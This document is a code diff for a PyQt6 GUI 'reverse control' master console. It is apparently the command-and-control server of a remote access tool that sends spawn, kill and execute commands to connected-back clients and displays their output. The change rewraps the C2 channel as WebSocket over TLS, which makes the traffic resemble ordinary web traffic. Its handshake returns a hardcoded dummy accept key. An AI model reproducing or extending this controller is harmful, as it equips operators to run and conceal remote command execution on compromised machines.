@@ -9,6 +9,131 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
 import struct
 
+WS_OP_CONTINUE = 0x00
+WS_OP_TEXT = 0x01
+WS_OP_BINARY = 0x02
+WS_OP_CLOSE = 0x08
+WS_OP_PING = 0x09
+WS_OP_PONG = 0x0A
+
+
+def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
+    """服务端：对客户端带mask的payload解掩码"""
+    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
+
+
+def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
+    """
+    构建服务端WebSocket帧：**服务端禁止mask**
+    """
+    header = bytearray()
+    # 第一个字节 fin + opcode
+    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
+    header.append(b1)
+
+    length = len(payload)
+    b2 = 0  # 服务端 mask位=0
+
+    if length <= 125:
+        b2 |= length
+        header.append(b2)
+    elif length <= 0xFFFF:
+        b2 |= 126
+        header.append(b2)
+        header.extend(struct.pack(">H", length))
+    else:
+        b2 |= 127
+        header.append(b2)
+        header.extend(struct.pack(">Q", length))
+
+    # 服务端不加mask key，直接拼接payload
+    return bytes(header) + payload
+
+
+def ws_parse_frame(data: bytearray):
+    """
+    解析WebSocket帧（服务端，客户端发来带mask）
+    返回：(fin, opcode, payload, consumed_bytes)
+    数据不足返回 (None, None, None, 0)；协议错误返回None
+    """
+    if len(data) < 2:
+        return (None, None, None, 0)
+    p = 0
+    b1 = data[p]
+    p += 1
+    b2 = data[p]
+    p += 1
+
+    fin = bool(b1 & 0x80)
+    opcode = b1 & 0x0F
+    has_mask = bool(b2 & 0x80)
+    payload_len = b2 & 0x7F
+
+    if payload_len == 126:
+        if len(data) < p + 2:
+            return (None, None, None, 0)
+        payload_len = struct.unpack(">H", data[p:p+2])[0]
+        p += 2
+    elif payload_len == 127:
+        if len(data) < p + 8:
+            return (None, None, None, 0)
+        payload_len = struct.unpack(">Q", data[p:p+8])[0]
+        p += 8
+
+    mask_key = b""
+    if has_mask:
+        if len(data) < p + 4:
+            return (None, None, None, 0)
+        mask_key = data[p:p+4]
+        p += 4
+
+    total_need = p + payload_len
+    if len(data) < total_need:
+        return (None, None, None, 0)
+
+    raw_payload = data[p:p+payload_len]
+    if has_mask:
+        payload = ws_unmask_payload(raw_payload, mask_key)
+    else:
+        payload = raw_payload
+
+    consumed = total_need
+    return (fin, opcode, payload, consumed)
+
+
+def ws_handle_http_upgrade(sock: ssl.SSLSocket) -> bool:
+    """处理WebSocket HTTP GET /ws 101升级握手"""
+    buf = bytearray()
+    sock.settimeout(3.0)
+    try:
+        while True:
+            chunk = sock.recv(1024)
+            if not chunk:
+                return False
+            buf.extend(chunk)
+            if b"\r\n\r\n" in buf:
+                break
+    except Exception:
+        return False
+    sock.settimeout(None)
+
+    if b"Upgrade: websocket" not in buf or b"Sec-WebSocket-Key:" not in buf:
+        return False
+
+    # 简易应答101 Switching Protocols
+    resp = (
+        b"HTTP/1.1 101 Switching Protocols\r\n"
+        b"Upgrade: websocket\r\n"
+        b"Connection: Upgrade\r\n"
+        b"Sec-WebSocket-Accept: dummy_accept\r\n"
+        b"\r\n"
+    )
+    try:
+        sock.sendall(resp)
+    except Exception:
+        return False
+    return True
+
 
 class ClientSignals(QObject):
     on_outp = pyqtSignal(object, str)
@@ -25,23 +150,37 @@ class ClientSession:
         self._recv_buf = bytearray()
         self.signals = ClientSignals()
         self._send_lock = threading.Lock()
+        # ws分片缓存
+        self._frag_buf = bytearray()
+        self._frag_opcode = 0
 
     def send_packet(self, body: bytes) -> bool:
+        """
+        上层调用和原来完全一样！
+        body就是原来业务包(PING/SPAW/KILL/EXEK...)，内部包装成WebSocket BINARY帧
+        """
         if not self.connected:
             return False
         try:
-            body_len = len(body)
-            header = struct.pack(">I", body_len)
-            packet = header + body
+            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, body)
             with self._send_lock:
-                self.conn.sendall(packet)
+                self.conn.sendall(ws_frame)
             return True
         except (OSError, BrokenPipeError, ssl.SSLError):
             self.close()
             return False
 
+    def reset_fragment(self):
+        self._frag_buf.clear()
+        self._frag_opcode = 0
+
     def close(self):
         self.connected = False
+        try:
+            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
+            self.conn.sendall(frame_close)
+        except Exception:
+            pass
         try:
             self.conn.shutdown(socket.SHUT_RDWR)
         except Exception:
@@ -130,7 +269,7 @@ class ClientListModel(QAbstractListModel):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("TLS反向控制主控端")
+        self.setWindowTitle("WSS WebSocket反向控制主控端")
         self.resize(700, 500)
         self.server_sock: socket.socket | None = None
         self.ssl_context = None
@@ -143,10 +282,10 @@ class MainWindow(QMainWindow):
         lay = QVBoxLayout(w)
 
         top_lay = QHBoxLayout()
-        top_lay.addWidget(QLabel("TLS监听端口:"))
-        self.port_edit = QLineEdit("8888")
+        top_lay.addWidget(QLabel("WSS监听端口:"))
+        self.port_edit = QLineEdit("4433")
         top_lay.addWidget(self.port_edit)
-        self.btn_start = QPushButton("启动TLS监听")
+        self.btn_start = QPushButton("启动WSS监听")
         self.btn_start.clicked.connect(self.start_server)
         top_lay.addWidget(self.btn_start)
         self.btn_stop = QPushButton("停止监听")
@@ -191,11 +330,18 @@ class MainWindow(QMainWindow):
                     raw_conn.close()
                     continue
 
+                # 执行WebSocket HTTP Upgrade握手
+                ok_handshake = ws_handle_http_upgrade(ssl_conn)
+                if not ok_handshake:
+                    self.log(f"WebSocket HTTP升级握手失败 {addr}")
+                    ssl_conn.close()
+                    continue
+
                 sess = ClientSession(ssl_conn, addr)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
-                self.log(f"[TLS新接入] {sess.ip_str}")
+                self.log(f"[WSS新接入] {sess.ip_str}")
                 t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                 t.start()
             except OSError:
@@ -211,7 +357,7 @@ class MainWindow(QMainWindow):
     def handle_session_disconnect(self, sess: ClientSession):
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
-            dlg.append_text("\n[!] TLS连接已经断开")
+            dlg.append_text("\n[!] WSS连接已经断开")
         self.client_model.remove_by_obj(sess)
         self.log(f"[断开] {sess.ip_str}")
 
@@ -224,24 +370,43 @@ class MainWindow(QMainWindow):
                     break
                 buf.extend(chunk)
 
-                while len(buf) >= 4:
-                    body_len = struct.unpack(">I", buf[0:4])[0]
-                    total_packet_len = 4 + body_len
-                    if len(buf) < total_packet_len:
+                while True:
+                    ret = ws_parse_frame(buf)
+                    fin, opcode, payload, consumed = ret
+                    if consumed <= 0:
                         break
+                    # 移除已经消费的数据
+                    del buf[:consumed]
 
-                    body = buf[4:total_packet_len]
-                    del buf[:total_packet_len]
-
-                    if len(body)>=4:
-                        cmd_code = body[0:4]
-                        if cmd_code == b"PONG":
-                            sess.last_pong = datetime.now()
-                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-                        elif cmd_code == b"OUTP":
-                            output_bytes = body[4:]
-                            out_text = output_bytes.decode("gbk", errors="replace")
-                            sess.signals.on_outp.emit(sess, out_text)
+                    # 处理控制帧 PING/PONG/CLOSE
+                    if opcode == WS_OP_PING:
+                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
+                        with sess._send_lock:
+                            sess.conn.sendall(pong_frame)
+                        continue
+                    elif opcode == WS_OP_PONG:
+                        continue
+                    elif opcode == WS_OP_CLOSE:
+                        break
+                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
+                        # 处理分片
+                        if opcode == WS_OP_BINARY:
+                            sess.reset_fragment()
+                            sess._frag_opcode = opcode
+                        sess._frag_buf.extend(payload)
+                        if fin:
+                            full_body = bytes(sess._frag_buf)
+                            sess.reset_fragment()
+                            # full_body == 原来裸TLS的body，业务逻辑完全复用！
+                            if len(full_body) >= 4:
+                                cmd_code = full_body[0:4]
+                                if cmd_code == b"PONG":
+                                    sess.last_pong = datetime.now()
+                                    self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+                                elif cmd_code == b"OUTP":
+                                    output_bytes = full_body[4:]
+                                    out_text = output_bytes.decode("gbk", errors="replace")
+                                    sess.signals.on_outp.emit(sess, out_text)
 
             except (OSError, ssl.SSLError):
                 break
@@ -259,16 +424,16 @@ class MainWindow(QMainWindow):
         self.server_sock.listen(8)
         self.server_running = True
         threading.Thread(target=self.accept_loop, daemon=True).start()
-        
+
         self.ping_timer.start()
-        
+
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
-        self.log(f"TLS服务端启动，监听端口 {port}")
+        self.log(f"WSS WebSocket服务端启动，监听端口 {port}")
 
     def stop_server(self):
         self.ping_timer.stop()
-        
+
         self.server_running = False
         if self.server_sock:
             try:
@@ -280,7 +445,7 @@ class MainWindow(QMainWindow):
         self.open_cmd_dialogs.clear()
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
-        self.log("TLS监听已停止")
+        self.log("WSS监听已停止")
 
     def on_context_menu(self, pos):
         idx = self.view.indexAt(pos)
